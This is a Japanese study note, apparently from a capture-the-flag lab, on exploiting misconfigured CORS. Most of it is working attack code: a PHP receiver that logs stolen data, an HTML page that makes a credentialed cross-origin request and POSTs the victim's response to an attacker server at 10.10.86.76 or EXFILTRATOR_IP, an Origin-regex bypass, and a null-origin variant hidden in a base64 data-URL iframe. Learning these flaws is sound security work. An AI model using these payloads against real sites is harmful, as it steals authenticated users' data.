# CORS と SOP

Cross Origin Resource Sharing クロスオリジンリソース共有

Same Origin Policy 同一生成元ポリシー

## 基本

Access-Control-Allow-Origin:  
ヘッダーが適切に扱われていない Web サイトが攻撃対象になる。

- 攻撃者は、攻撃者のホストに HTML を配置する。
- その HTML は、他サイトへのリクエスト１後、スパイホストへのリクエスト２を実行する。
- リクエスト２は POST で、リクエスト１の応答が丸ごと含まれる。
- なんとかして被害者に HTML を開かせると、通信内容を盗める仕組み。

スパイサイトに置く PHP。リクエストデータを丸ごと data.txt に保存する。

```php
<?php
header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
header('Access-Control-Allow-Credentials: true');

$postdata = file_get_contents("php://input");
file_put_contents('data.txt', $postdata);
?>
```

攻撃者のホストに配置する HTML の例

```html
<html>
  <head>
  <title>Data Exfiltrator Exploit</title>
  <script>
    //Function which will make CORS request to target application web page to grab the HTTP response
    function exploit() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        var all = this.responseText;
        exfiltrate(all);
     }
    };
    xhttp.open("GET", "http://corssop.thm/badregex.php", true);
    xhttp.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,\/;q=0.8");
    xhttp.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
    xhttp.withCredentials = true;
    xhttp.send();
    }

    function exfiltrate(data_all) {
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "http://10.10.86.76:81/receiver.php", true); //Replace the URL with attacker controlled Server

          xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
          xhr.withCredentials = true;
          var body = data_all;
          var aBody = new Uint8Array(body.length);
          for (var i = 0; i < aBody.length; i++)
            aBody[i] = body.charCodeAt(i);
          xhr.send(new Blob([aBody]));
    }
    </script>
</head>
<body onload="exploit()">
<div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
<textarea id="load" style="width: 1183px; height: 305px;">
```

## 不正な正規表現

サーバーが次の正規表現で Origin をフィルターしているとする（#は正規表現のデリミタ）  
この場合、http://corssop.thm.attacker.com を攻撃ホストとすることでバイパスされてしまう。

```php
if (isset($_SERVER['HTTP_ORIGIN']) && preg_match('#corssop.thm#', $_SERVER['HTTP_ORIGIN'])) {
    header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']."");
    header('Access-Control-Allow-Credentials: true');
}
```

## null Origin

file: によるリクエストや、iframe 内からのリクエストの場合、Origin: null となる。  
Access-Control-Allow-Origin: null が許可されている場合、狙われる可能性がある。

```html
<div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
  <iframe id="exploitFrame" style="display:none;"></iframe>
  <textarea id="load" style="width: 1183px; height: 305px;"></textarea>
</div>

<script>
  // JavaScript code for the exploit, adapted for inclusion in a data URL
  var exploitCode = `
      <script>
        function exploit() {
          var xhttp = new XMLHttpRequest();
          xhttp.open("GET", "http://corssop.thm/null.php", true);
          xhttp.withCredentials = true;
          xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
              // Assuming you want to exfiltrate data to a controlled server
              var exfiltrate = function(data) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "http://EXFILTRATOR_IP/receiver.php", true);
                xhr.withCredentials = true;
                var body = data;
                var aBody = new Uint8Array(body.length);
                for (var i = 0; i < aBody.length; i++)
                  aBody[i] = body.charCodeAt(i);
                xhr.send(new Blob([aBody]));
              };
              exfiltrate(this.responseText);
            }
          };
          xhttp.send();
        }
        exploit();
      <\/script>
    `;

  // Encode the exploit code for use in a data URL
  var encodedExploit = btoa(exploitCode);

  // Set the iframe's src to the data URL containing the exploit
  document.getElementById("exploitFrame").src =
    "data:text/html;base64," + encodedExploit;
</script>
```
